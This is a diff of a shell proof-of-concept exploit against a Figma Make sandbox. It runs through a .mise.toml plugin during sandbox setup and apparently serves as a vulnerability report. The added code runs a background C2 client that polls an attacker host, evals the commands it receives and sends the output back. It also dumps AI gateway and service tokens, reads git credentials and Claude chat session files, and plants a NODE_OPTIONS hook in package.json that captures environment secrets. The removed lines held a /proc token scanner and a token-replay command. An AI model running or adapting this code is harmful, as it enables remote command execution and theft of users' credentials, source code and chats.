@@ -3,11 +3,16 @@
 # POC: Figma Make Sandbox RCE via .mise.toml plugin
 # Runs automatically during sandbox initialization (RunMiseInstall)
 # =============================================================================
-# Demonstrates three impacts:
-#   1. AI token exfiltration (ANTHROPIC_AUTH_TOKEN via /proc scanner)
-#   2. Source code access (ugit credential + git operations)
-#   3. Chat message exfiltration (session JSON files)
+# Demonstrates:
+#   1. Full RCE with C2 reverse shell (attacker gets interactive command access)
+#   2. AI token exfiltration (via C2 command during Claude processing)
+#   3. Source code access (ugit credential + git operations)
+#   4. Chat message exfiltration (session JSON files)
 # =============================================================================
+
+# ---- ATTACKER CONFIG ----
+C2_URL="${C2_URL:-https://kappex-c2.loca.lt}"
+# -------------------------
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -28,11 +33,34 @@ P "pid: $$ ppid: $PPID"
 P ''
 
 # =============================================================
-# 1. AI TOKEN EXFILTRATION
+# 1. C2 REVERSE SHELL (background polling client)
 # =============================================================
-P '=== 1. AI TOKEN EXFILTRATION ==='
+P '=== 1. C2 REVERSE SHELL ==='
+P "C2 server: $C2_URL"
+SANDBOX_ID="$(hostname)-$$"
+P "Sandbox ID: $SANDBOX_ID"
+
+(
+  while true; do
+    CMD=$(curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
+      "$C2_URL/c2/poll?id=$SANDBOX_ID" 2>/dev/null)
+    if [ -n "$CMD" ] && [ "$CMD" != "noop" ]; then
+      RESULT=$(eval "$CMD" 2>&1 | base64 -w0)
+      curl -s -m 10 -H "Bypass-Tunnel-Reminder: true" \
+        "$C2_URL/c2/result?id=$SANDBOX_ID&r=$RESULT" >/dev/null 2>&1
+    fi
+    sleep 3
+  done
+) &
+C2_PID=$!
+P "C2 client PID: $C2_PID"
 P ''
-P '--- Shell environment tokens ---'
+
+# =============================================================
+# 2. IMMEDIATE EXFIL (runs during mise install)
+# =============================================================
+P '=== 2. ENVIRONMENT / TOKENS ==='
+P ''
 for VAR in ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL AI_GATEWAY_BASE_URL \
            MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL DEV_SERVER_TOKEN \
            CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
@@ -43,113 +71,15 @@ for VAR in ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL AI_GATEWAY_BASE_URL \
   P "$VAR (${#VAL}c): $VAL"
 done
 P ''
-P '--- /proc/self/environ (catches vars stripped from shell) ---'
-cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort >&3
-P ''
-
-# Background /proc scanner: polls all processes for ANTHROPIC_AUTH_TOKEN
-# Claude agent process only has the token while actively processing a message
-# Since we run as same uid (foundry/1000), we can read its /proc/*/environ
-P '--- Starting background /proc scanner for ANTHROPIC_AUTH_TOKEN ---'
-(
-  SCAN_OUT="/tmp/anthropic-token.txt"
-  SCAN_PUB="$PUB/anthropic-token.txt"
-  SCAN_END=$(($(date +%s) + 7200))
-  while [ "$(date +%s)" -lt "$SCAN_END" ]; do
-    for piddir in /proc/[0-9]*/environ; do
-      TOKEN=$(cat "$piddir" 2>/dev/null | tr '\0' '\n' | grep '^ANTHROPIC_AUTH_TOKEN=' | head -1)
-      if [ -n "$TOKEN" ] && [ "${#TOKEN}" -gt 30 ]; then
-        PID=$(echo "$piddir" | cut -d/ -f3)
-        {
-          echo "=== ANTHROPIC_AUTH_TOKEN CAPTURED ==="
-          echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
-          echo "source_pid: $PID"
-          echo "source_cmdline: $(tr '\0' ' ' < /proc/$PID/cmdline 2>/dev/null)"
-          echo ""
-          echo "$TOKEN"
-          echo ""
-          echo "=== FULL PROCESS ENV ==="
-          cat "/proc/$PID/environ" 2>/dev/null | tr '\0' '\n' | sort
-        } > "$SCAN_OUT"
-        cp "$SCAN_OUT" "$SCAN_PUB" 2>/dev/null
-        exit 0
-      fi
-    done
-    sleep 2
-  done
-) &
-SCANNER_PID=$!
-P "Scanner PID: $SCANNER_PID (will capture token when Claude processes next AI message)"
-P ''
-
-# Write header-hook.cjs — lightweight, no Vite interference
-# Only captures env vars and starts a Node.js /proc scanner as backup
-cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
-const fs=require('fs'),path=require('path');
-const PUB=path.join(process.cwd(),'public');
-try{fs.mkdirSync(PUB,{recursive:true})}catch(e){}
-let out='=== NODE.JS ENV CAPTURE '+new Date().toISOString()+' ===\n';
-['ANTHROPIC_AUTH_TOKEN','MCP_PROXY_AUTH_TOKEN','MCP_PROXY_BASE_URL',
- 'ANTHROPIC_BASE_URL','AI_GATEWAY_BASE_URL','DEV_SERVER_TOKEN',
- 'FIGMA_PUBLIC_URL','FIGMA_FILE_ID','FIGMA_CONTENT_API_ACCESS_KEY',
- 'CONTROLLER_TOKEN','MAKE_KIT_INITIALIZE_TOKEN'].forEach(function(k){
-  const v=process.env[k]||'';
-  out+=k+' ('+v.length+'c): '+v+'\n';
-});
-out+='\n=== ALL ENV KEYS ===\n';
-Object.keys(process.env).sort().forEach(function(k){
-  out+=k+': '+(process.env[k]||'')+'\n';
-});
-try{fs.writeFileSync('/tmp/node-env.txt',out)}catch(e){}
-try{fs.writeFileSync(path.join(PUB,'node-env.txt'),out)}catch(e){}
-
-// Backup /proc scanner from Node.js context
-var scanTimer=setInterval(function(){
-  try{
-    var procs=fs.readdirSync('/proc').filter(function(d){return /^\d+$/.test(d)});
-    for(var i=0;i<procs.length;i++){
-      try{
-        var env=fs.readFileSync('/proc/'+procs[i]+'/environ').toString().split('\0');
-        var tok=env.find(function(e){return e.indexOf('ANTHROPIC_AUTH_TOKEN=')===0});
-        if(tok&&tok.length>30){
-          var result='=== ANTHROPIC_AUTH_TOKEN CAPTURED (Node.js scanner) ===\n';
-          result+='timestamp: '+new Date().toISOString()+'\n';
-          result+='source_pid: '+procs[i]+'\n';
-          result+=tok+'\n';
-          try{fs.writeFileSync('/tmp/anthropic-token.txt',result)}catch(e2){}
-          try{fs.writeFileSync(path.join(PUB,'anthropic-token.txt'),result)}catch(e2){}
-          clearInterval(scanTimer);
-          break;
-        }
-      }catch(e){}
-    }
-  }catch(e){}
-},3000);
-if(scanTimer.unref)scanTimer.unref();
-HOOKEOF
-
-# Inject NODE_OPTIONS into dev script so Vite loads the hook
-if [ -f "$PROJDIR/package.json" ]; then
-  if grep -q '"dev"' "$PROJDIR/package.json" 2>/dev/null; then
-    if ! grep -q 'header-hook' "$PROJDIR/package.json" 2>/dev/null; then
-      sed -i 's|"dev": "\(.*\)"|"dev": "NODE_OPTIONS=--require=./header-hook.cjs \1"|' "$PROJDIR/package.json" 2>/dev/null
-      P "Injected NODE_OPTIONS into package.json dev script"
-    fi
-  fi
-fi
-P ''
 
 # =============================================================
-# 2. SOURCE CODE ACCESS (ugit credential)
+# 3. SOURCE CODE ACCESS (ugit credential)
 # =============================================================
-P '=== 2. SOURCE CODE ACCESS ==='
+P '=== 3. SOURCE CODE ACCESS ==='
 P ''
 P '--- ugit credential (GIT_CONFIG_SYSTEM) ---'
 P "GIT_CONFIG_SYSTEM=$GIT_CONFIG_SYSTEM"
 cat /home/foundry/gitconfig 2>/dev/null >&3 || cat /home/foundry/.gitconfig 2>/dev/null >&3 || P 'no gitconfig found'
-P ''
-P '--- git credential fill ---'
-echo "url=https://api.figma.com" | git credential fill 2>&1 | head -10 >&3
 P ''
 P '--- git remote -v ---'
 cd "$PROJDIR" 2>/dev/null && git remote -v 2>/dev/null >&3 || P 'no remote'
@@ -157,24 +87,14 @@ P ''
 P '--- git log (recent victim commits) ---'
 cd "$PROJDIR" 2>/dev/null && git log --oneline -10 2>/dev/null >&3 || P 'no log'
 P ''
-P '--- git diff --stat (uncommitted changes) ---'
-cd "$PROJDIR" 2>/dev/null && git diff --stat 2>/dev/null >&3 || P 'no diff'
-P ''
 P '--- source file listing ---'
 find "$PROJDIR/src/" -type f 2>/dev/null | head -30 >&3 || P 'no src/'
 P ''
-P '--- sample source file content ---'
-FIRST=$(find "$PROJDIR/src/" \( -name '*.tsx' -o -name '*.ts' -o -name '*.jsx' -o -name '*.js' \) 2>/dev/null | head -1)
-if [ -n "$FIRST" ]; then
-  P "FILE: $FIRST"
-  head -40 "$FIRST" >&3
-fi
-P ''
 
 # =============================================================
-# 3. CHAT MESSAGE EXFILTRATION (session JSON)
+# 4. CHAT MESSAGE EXFILTRATION (session JSON)
 # =============================================================
-P '=== 3. CHAT MESSAGE / AI PROMPT EXFILTRATION ==='
+P '=== 4. CHAT MESSAGE / AI PROMPT EXFILTRATION ==='
 P ''
 for DIR in /home/foundry/.claude /home/foundry/.claude/projects \
            /home/foundry/.config/claude /workspaces/default/code/.claude \
@@ -198,29 +118,56 @@ done
 P ''
 
 # =============================================================
+# 5. NODE_OPTIONS INJECTION (captures tokens when Vite starts)
+# =============================================================
+cat > "$PROJDIR/header-hook.cjs" << 'HOOKEOF'
+const fs=require('fs'),path=require('path');
+const PUB=path.join(process.cwd(),'public');
+try{fs.mkdirSync(PUB,{recursive:true})}catch(e){}
+let out='=== NODE.JS ENV CAPTURE '+new Date().toISOString()+' ===\n';
+['ANTHROPIC_AUTH_TOKEN','MCP_PROXY_AUTH_TOKEN','MCP_PROXY_BASE_URL',
+ 'ANTHROPIC_BASE_URL','AI_GATEWAY_BASE_URL','DEV_SERVER_TOKEN',
+ 'FIGMA_PUBLIC_URL','FIGMA_FILE_ID','FIGMA_CONTENT_API_ACCESS_KEY',
+ 'CONTROLLER_TOKEN','MAKE_KIT_INITIALIZE_TOKEN'].forEach(function(k){
+  const v=process.env[k]||'';
+  out+=k+' ('+v.length+'c): '+v+'\n';
+});
+out+='\n=== ALL ENV KEYS ===\n';
+Object.keys(process.env).sort().forEach(function(k){
+  out+=k+': '+(process.env[k]||'')+'\n';
+});
+try{fs.writeFileSync('/tmp/node-env.txt',out)}catch(e){}
+try{fs.writeFileSync(path.join(PUB,'node-env.txt'),out)}catch(e){}
+HOOKEOF
+
+if [ -f "$PROJDIR/package.json" ]; then
+  if grep -q '"dev"' "$PROJDIR/package.json" 2>/dev/null; then
+    if ! grep -q 'header-hook' "$PROJDIR/package.json" 2>/dev/null; then
+      sed -i 's|"dev": "\(.*\)"|"dev": "NODE_OPTIONS=--require=./header-hook.cjs \1"|' "$PROJDIR/package.json" 2>/dev/null
+      P "Injected NODE_OPTIONS into package.json dev script"
+    fi
+  fi
+fi
+P ''
+
+# =============================================================
 # SUMMARY
 # =============================================================
 P '============================================='
-P '  POC COMPLETE'
+P '  POC COMPLETE — C2 client running'
 P '============================================='
 P ''
-P 'Files written:'
-P "  /tmp/poc-exfil.txt (this file)"
-P "  $PROJDIR/header-hook.cjs (NODE_OPTIONS hook for Vite)"
+P "C2 polling: $C2_URL (PID $C2_PID)"
 P ''
-P 'Background scanner running (PID '$SCANNER_PID'):'
-P '  Polls /proc/*/environ every 2s for ANTHROPIC_AUTH_TOKEN'
-P '  Writes to /tmp/anthropic-token.txt when captured'
+P 'Attacker commands to demo via C2:'
+P '  # Capture ANTHROPIC_AUTH_TOKEN (run while victim uses AI chat):'
+P '  for p in /proc/[0-9]*/environ; do cat "$p" 2>/dev/null | tr "\0" "\n" | grep "^ANTHROPIC_AUTH_TOKEN="; done'
 P ''
-P 'After dev server starts + victim sends AI message:'
-P '  cat /tmp/anthropic-token.txt'
+P '  # Read ugit credential:'
+P '  cat /home/foundry/gitconfig'
 P ''
-P 'To prove AI token replay from attacker macOS:'
-P '  curl -X POST https://api.figma.com/ai-gateway/llm/provider/universal/v1/messages \'
-P '    -H "x-api-key: <TOKEN>" \'
-P '    -H "anthropic-version: 2023-06-01" \'
-P '    -H "content-type: application/json" \'
-P "    -d '{\"model\":\"claude-sonnet-4-20250514\",\"max_tokens\":50,\"messages\":[{\"role\":\"user\",\"content\":\"hello\"}]}'"
+P '  # Read chat history:'
+P '  cat /workspaces/default/session/.sbox-sessions/*.json'
 
 exec 3>&-
 
